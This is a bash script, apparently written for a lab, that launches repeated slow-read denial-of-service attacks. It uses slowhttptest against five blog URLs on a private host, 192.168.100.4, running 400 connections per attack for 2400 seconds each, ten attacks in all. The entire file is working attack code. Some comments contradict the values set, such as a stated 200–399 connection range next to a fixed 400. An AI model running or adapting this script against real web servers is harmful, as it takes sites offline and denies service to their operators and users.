#!/bin/bash

TARGET_IP="192.168.100.4"
PORT=80
DURATION=2400

# Daftar URL path
URL_PATHS=(
  "/2025/06/05/understanding-different-types-of-denial-of-service-dos-attacks/"
  "/2025/06/05/how-to-detect-and-mitigate-slow-read-attacks-on-your-website/"
  "/2025/06/05/what-is-a-slow-read-attack-understanding-this-sneaky-cyber-threat/"
  "/"
  "/2025/06/05/hello-world/"
)

# Total 2 serangan per URL × 5 URL = 10 total serangan
ATTACK_COUNT=1
for url in "${URL_PATHS[@]}"; do
  for repeat in {1..2}; do
    echo "Starting Slow Read Attack #$ATTACK_COUNT on $url"

    CONNS=$((400))     # 200–399 connections
    READSIZE=$((RANDOM % 20 + 5))     # 5–24 reads/sec
    INTERVAL=$((RANDOM % 5 + 20))     # 20–24 sec delay

    slowhttptest -c $CONNS \
      -r $READSIZE \
      -t X \
      -u http://$TARGET_IP$url \
      -x $PORT \
      -p 3 \
      -l $DURATION \
      -o output_slowread_$ATTACK_COUNT

    echo "Finished attack #$ATTACK_COUNT on $url. Sleeping $INTERVAL seconds..."
    sleep $INTERVAL

    ((ATTACK_COUNT++))
  done
done

